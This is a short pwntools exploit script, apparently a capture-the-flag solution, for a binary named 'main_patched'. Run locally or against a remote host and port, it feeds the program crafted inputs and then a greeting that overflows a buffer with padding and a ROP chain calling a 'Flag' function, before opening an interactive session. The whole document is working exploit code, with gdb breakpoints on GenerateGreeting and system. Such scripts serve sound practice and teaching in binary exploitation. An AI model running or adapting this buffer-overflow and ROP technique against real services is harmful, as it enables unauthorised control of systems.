from pwn import *
import sys

BINARY = "main_patched"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"

def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.send(content)


x, p = init()

x.debug((
    "break *_Z16GenerateGreetingci+288\nc\n"
    "break *system\nc\n"
))


def exploit(r: ROP):
    p.sendlineafter(b"character: \n", b"A")
    p.sendlineafter(b"symbols: \n", b"ABCCDDE\0\0\0")
    sleep(1)

    pay = b"AA\0\0\0\0"+cyclic(8)
    pay += flat(r)
    p.sendafter(b"greeting: \n", pay)
    print(p.recv(10000))

r = ROP(exe)
r.raw(r.find_gadget(['ret']))
r.call('_Z4Flagv')
exploit(r)

p.interactive()
